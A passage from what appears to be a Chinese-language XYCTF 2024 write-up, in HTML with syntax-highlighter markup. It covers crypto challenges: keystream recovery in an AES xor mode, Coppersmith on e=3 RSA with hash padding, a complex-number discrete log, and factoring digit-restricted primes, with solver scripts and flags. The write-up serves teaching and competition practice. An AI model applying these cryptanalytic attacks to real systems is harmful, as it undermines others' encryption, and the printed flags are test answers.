class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">y</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">y</span>)<br>        <span class="hljs-keyword">cs</span> = <span class="hljs-keyword">ps</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">cs</span><br><span class="hljs-keyword">ps</span>=repeat_rabin(<span class="hljs-number">12</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q)<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">m</span> in <span class="hljs-keyword">ps</span>:<br>    <span class="hljs-keyword">print</span>(long_to_bytes(<span class="hljs-keyword">m</span>))<br><br></code></pre></td></tr></table></figure><img src="/2024/04/29/XYCTF2024WP/image-20240401222652666.png" class title="image-20240401222652666"><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> os<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"rb"</span>).read()<br>key = os.urandom(<span class="hljs-number">16</span>)<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>flag = pad(flag, <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">key, plaintext</span>):<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-keyword">return</span> cipher.encrypt(plaintext)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">key, plaintext, iv</span>):<br>    ciphertext = <span class="hljs-string">b""</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), AES.block_size):<br>        key_block = aes_encrypt(key, iv)<br>        ciphertext_block = <span class="hljs-built_in">bytes</span>(<br>            [plaintext[i + j] ^ key_block[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(AES.block_size)]<br>        )<br>        ciphertext += ciphertext_block<br>        iv = key_block<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"1.print\n2.input\n3.exit"</span>)<br>        a = <span class="hljs-built_in">input</span>(<span class="hljs-string">"&gt; "</span>)<br>        <span class="hljs-keyword">if</span> a == <span class="hljs-string">"1"</span>:<br>            <span class="hljs-built_in">print</span>((iv + encrypt(key, flag, iv)).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">"2"</span>:<br>            ivs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">"iv: "</span>))<br>            inputs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">"message: "</span>))<br>            <span class="hljs-built_in">print</span>(encrypt(key, inputs, ivs).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">"3"</span>:<br>            exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"You need input 1,2,3"</span>)<br>    <span class="hljs-keyword">except</span>:exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>分析代码可知，加密过程是异或操作，每一轮的密钥由上一轮的iv经过AES的ECB模式加密得到，加密的key未知。</p><p>题目两个功能，1选项，给出初始iv和加密后的flag密文，暂时不知道如何解密，缺少key或者每轮的key_block,2选项，输入iv和一个明文，得到其加密后的密文。</p><p>关键点在这里，已知明文密文，加密过程是异或，能否求出key_block。但key_block是AES加密的，由key和iv得到，key全程未知，初始iv已知，故不可能我们正向得到key_block，那么能否逆向得到加密后的key_block呢？</p><p>这里选择2允许我们自定义加密明文和密文，我们可以令ivs为初始iv，那么两次加密过程的每轮key_block一样，故先输入1，获取初始iv和flag_c，再输入2，令两次初始iv相同，根据得到的明文密文求出每轮key_block，再求解。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">flag_c</span>=<span class="hljs-string">'600106b927db260469a566518b6e64aa69018fcbed26078a3f7df0108be6f753d67bda6bf16dbf1de6ebe8c1aa134abe3ef6c0b1ccc140f5ff08a86a1a04afc5'</span><br><br><span class="hljs-attribute">flag_c</span>=bytes.fromhex(flag_c)<br>flag_iv,<span class="hljs-attribute">flag_c</span>=flag_c[:16],flag_c[16:]<br><br><span class="hljs-attribute">iv</span>=flag_iv.hex()<br><span class="hljs-attribute">iv</span>=bytes.fromhex(iv)<br><span class="hljs-attribute">m</span>=iv*3<br><span class="hljs-attribute">c</span>=<span class="hljs-string">'5159ca268c8611b960bea22262bfbe9c834db9ffe2d5ae2ca22fbca240501c766ac7a26edd785497a59eb331956ecf6b'</span><br><span class="hljs-attribute">c</span>=bytes.fromhex(c)<br><br><br><span class="hljs-attribute">iv_c</span>=bytes(c[i]^m[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(16<span class="hljs-number">*3</span>))<br><span class="hljs-attribute">c</span>=b''<br>key_block = iv_c<span class="hljs-number">*3</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,48,16):<br>    ciphertext_block = bytes(<br>        [flag_c[i+j] ^ key_block[i+j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(16)]<br>    )<br>    c += ciphertext_block<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#b'XYCTF{076f4cb7-e57e-4c75-a22a-2b40df6b2f33}\n\x04\x04\x04\x04'</span><br></code></pre></td></tr></table></figure><h3 id="反方向的密码-相思"><a href="#反方向的密码-相思" class="headerlink" title="反方向的密码 相思"></a>反方向的密码 相思</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(x.encode()).digest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> message + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message)))<br><br><br>m = bytes_to_long(pad(flag))<br>p = getStrongPrime(<span class="hljs-number">512</span>)<br>q = getStrongPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br><span class="hljs-comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br><br></code></pre></td></tr></table></figure><p>代码很简单就是个RSA加密，但生成的素数是强素数，无法分解，注意到e=3,想到低加密指数攻击，但开方出来不对，可能是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.92ex" height="1.553ex" role="img" focusable="false" viewbox="0 -675.5 1290.5 686.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(911,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g></g></g></svg></mjx-container>&gt;n,尝试爆破k，还是没能求解。仔细观察，发现明文经过hash填充，仔细想想，一个flag内容算10个字符内容吗，加上XYCTF{},有17 * 8 =136位，加上填充256位，再3次方有1176位，k就有100多位大小，不太可能爆破出来。又尝试能否有限域开方，失败。</p><p>仔细观察代码。这里不是对flag内容的hash填充，而是对长度，因此一个flag长度再怎么也在100以内，故填充内容可以爆破得知。现在已知明文低位，以及明文部分高位，尝试coppersmith求中间位。这里，需要调整一下small_roots的参数。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">c=<span class="hljs-number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br>n=<span class="hljs-number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br>e = <span class="hljs-number">3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>m0=bytes_to_long(b<span class="hljs-string">'XYCTF{'</span>)<br>m3=bytes_to_long(b<span class="hljs-string">'}'</span>)<br>def hash(x):<br>    a=hashlib.sha256(x.encode()).digest()<br>    <span class="hljs-keyword">return</span> a<br>num=<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>,<span class="hljs-number">47</span>):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    m2=bytes_to_long(hash(str(i)))<br>    N=((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2)^e-c<br>    N=N.monic()<br>    m=N.small_roots(x=<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)), beta=<span class="hljs-number">1</span>, epsilon=<span class="hljs-number">0.05</span>)<br>    <span class="hljs-built_in">print</span>(i,(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)),m)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-name">m</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3))<br>        <span class="hljs-built_in">print</span>(long_to_bytes((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2))<br><span class="hljs-string">''</span><span class="hljs-string">'</span><br><span class="hljs-string">38 248 [58964190787951927773278389967057377362495121527440001979648729026891046689]</span><br><span class="hljs-string">b'</span>!__d3ng__hu0__1@n__3h@n__Chu__!}<span class="hljs-string">'</span><br><span class="hljs-string">b'</span>XYCTF{!__d3ng__hu0__1@n__3h@n__Chu__!}\xae\xa9!<span class="hljs-number">2</span>\xc4\xcb\xeb&amp;&gt;j\xc2\xbfl\x18;]\x81s\x7f\x17\x9f!\xef\xdcXcs\x96r\xf0\xf4p<span class="hljs-string">'</span><br><span class="hljs-string">'</span><span class="hljs-string">''</span><br></code></pre></td></tr></table></figure><h3 id="Complex-dlp"><a href="#Complex-dlp" class="headerlink" title="Complex_dlp"></a>Complex_dlp</h3><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from secrets import flag<br><br><br>class Complex:<br>    def __init__(self, re, im):<br>        self.re = re<br>        self.im = im<br><br>    def __mul__(self, c):<br>        re_ = self.re * c.re - self.im * c.im<br>        im_ = self.re * c.im + self.im * c.re<br>        return Complex(re_, im_)<br><br>    def __str__(self):<br>        if self.im == 0:<br>            return str(self.re)<br>        elif self.re == 0:<br>            if abs(self.im) == 1:<br>                return f"{'-' if self.im &lt; 0 else ''}i"<br>            else:<br>                return f"{self.im}i"<br>        else:<br>            return f"{self.re} {'+' if self.im &gt; 0 else '-'} {abs(self.im)}i"<br><br><br>def complex_pow(c, exp, n):<br>    result = Complex(1, 0)<br>    while exp &gt; 0:<br>        if exp &amp; 1:<br>            result = result * c<br>            result.re = result.re % n<br>            result.im = result.im % n<br>        c = c * c<br>        c.re = c.re % n<br>        c.im = c.im % n<br>        exp &gt;&gt;= 1<br>    return result<br><br><br>flag = flag.strip(b"XYCTF{").strip(b"}")<br>p = 1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>g = Complex(3, 7)<br>x = bytes_to_long(flag)<br>print(complex_pow(g, x, p))<br># 5699996596230726507553778181714315375600519769517892864468100565238657988087817 + 198037503897625840198829901785272602849546728822078622977599179234202360717671908i<br><br></code></pre></td></tr></table></figure><p>定义了一个复数类，flag为指数。考点在复数域下求离散对数，先将复数转换成实数，再求离散对数。</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">g=3^2+7^2<br>a,b=5699996596230726507553778181714315375600519769517892864468100565238657988087817 , 198037503897625840198829901785272602849546728822078622977599179234202360717671908<br>c=a^2+b^2<br>p=1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>from Crypto.Util.number import *<br>G=Zmod(p) <br>g=G(g) <br>c=G(c) <br>print(long_to_bytes(ZZ(discrete_log(c,g))))<br>#___c0mp13x_d1p_15_3@5y_f0r_y0u___<br></code></pre></td></tr></table></figure><h3 id="happy-to-solve2"><a href="#happy-to-solve2" class="headerlink" title="happy_to_solve2"></a>happy_to_solve2</h3><p>源码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">import random<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import *<br><span class="hljs-selector-tag">from</span> secrets import flag<br><br><br>def get_happy_prime():<br>    while <span class="hljs-number">1</span>:<br>        p = <span class="hljs-built_in">int</span>(<span class="hljs-string">""</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">"123"</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        q = <span class="hljs-built_in">int</span>(<span class="hljs-string">""</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">"567"</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        if <span class="hljs-built_in">isPrime</span>(p) and <span class="hljs-built_in">isPrime</span>(q):<br>            return (p,q)<br><br>m = <span class="hljs-built_in">bytes_to_long</span>(flag)<br>p ,q= <span class="hljs-built_in">get_happy_prime</span>()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br># <span class="hljs-number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span><br># <span class="hljs-number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span><br><br></code></pre></td></tr></table></figure><p>p,q的十进制位由特定数字123和456组成，对于任意a,b,c,d，组成的10进制数ab,cd存在</p><script type="math/tex; mode=display">n=p*q=(10*a+b)(10*c+d)=a*c*100^2+(b*c+a*d)*10+b*d</script><script type="math/tex; mode=display">n-b*d=a*c*100^2+(b*c+a*d)*10</script><p>故n-b*d结果的b,d所在十进制位为0，p,q的一个十进制位有3种可能，一组p,q相同位有9种，爆破找到其中满足条件的</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">n</span>=697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">c</span>=153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-attribute">p</span>=<span class="hljs-string">''</span><br><span class="hljs-attribute">q</span>=<span class="hljs-string">''</span><br>def get_pq(p1,q1,i):<br>    a=[]<br>    <span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> <span class="hljs-string">'123'</span>:<br>        <span class="hljs-keyword">for</span> qi <span class="hljs-keyword">in</span> <span class="hljs-string">'567'</span>:<br>            p = pi + p1<br>            q = qi + q1<br>            p,<span class="hljs-attribute">q</span>=map(int,[p,q])<br><br>            <span class="hljs-keyword">if</span> (n - p * q) % pow(10, i+1) == 0:<br>                a.append([p,q])<br>    return a<br>PQ=[[p,q]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(512):<br>    tmp_PQ=[]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> PQ:<br>        p,<span class="hljs-attribute">q</span>=j<br>        tmp_PQ+=get_pq(str(p),str(q),i)<br>    <span class="hljs-attribute">PQ</span>=tmp_PQ<br><span class="hljs-keyword">for</span> p,q <span class="hljs-keyword">in</span> PQ:<br>    <span class="hljs-keyword">if</span> isPrime(p):<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">'{p=}'</span>)<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">'{q=}'</span>)<br>        <span class="hljs-built_in">print</span>(n % p, n % q, n == p * q)<br>        d = invert(e, (p - 1) * (q - 1))<br>        m = powmod(c, d, n)<br>        <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b'XYCTF{7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0}'</span><br></code></pre></td></tr></table></figure><h3 id="factor3"><a href="#factor3" class="headerlink" title="factor3"></a>factor3</h3><p>题目：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> random<br><br><span class="hljs-attribute">flag</span> = b'XYCTF{*****}'<br><span class="hljs-attribute">m</span> = bytes_to_long(flag)<br><span class="hljs-attribute">def</span> gainPrime():<br>    <span class="hljs-attribute">while</span> True:<br>        <span class="hljs-attribute">x</span> = random.getrandbits(<span class="hljs-number">256</span>)<br>        <span class="hljs-attribute">y</span> = random.getrandbits(<span class="hljs-number">256</span>)<br><br>        <span class="hljs-attribute">if</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span 